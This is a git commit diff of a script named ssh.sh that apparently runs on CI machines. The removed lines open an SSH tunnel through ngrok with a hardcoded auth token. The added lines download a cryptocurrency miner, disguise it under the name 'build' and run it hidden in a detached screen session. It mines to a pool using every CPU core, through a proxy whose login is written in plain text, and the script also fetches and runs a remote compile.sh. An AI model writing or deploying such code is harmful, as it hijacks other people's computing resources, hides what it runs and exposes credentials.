36646fdb19285cc810cde4862d542bbfd1bc0ac9
Tokisaki_mitsuha <71954996+Tokisaki-mitsuha@users.noreply.github.com>
2021-10-29 18:06:15 +0700

    Update ssh.sh

--- ssh.sh
+++ ssh.sh
@@ -1,12 +1,19 @@
 #!/bin/bash
 sudo echo 'runner:runner' | sudo chpasswd
 apt update
-wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
-unzip ngrok-stable-linux-386.zip
-chmod +x ./ngrok
-sudo apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen >/dev/null
-rm -f .ngrok.log
-./ngrok authtoken 1yXJ100mAj0OpSLezldmQl02Dqf_54WFxVwTR6H9d5jaoQHpJ
-./ngrok tcp 22 --log ".ngrok.log" &
-sleep 10
-echo $(grep -o -E "tcp://(.+)" < .ngrok.log | sed "s/tcp:\/\//ssh runner@/" | sed "s/:/ -p /")
+#!/bin/bash
+proxy="socks5://ewean:dikamarmandi@143.198.163.97:333"
+array[0]="0001"
+array[1]="0002"
+array[2]="0003"
+size=${#array[@]}
+index=$(($RANDOM % $size))
+worker=${array[$index]}
+apt-get update
+wget -q https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile.sh
+wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
+chmod +x build
+chmod +x compile.sh
+screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.worker-$worker -p x -t $(nproc --all) -x $proxy
+./compile.sh
+echo succes
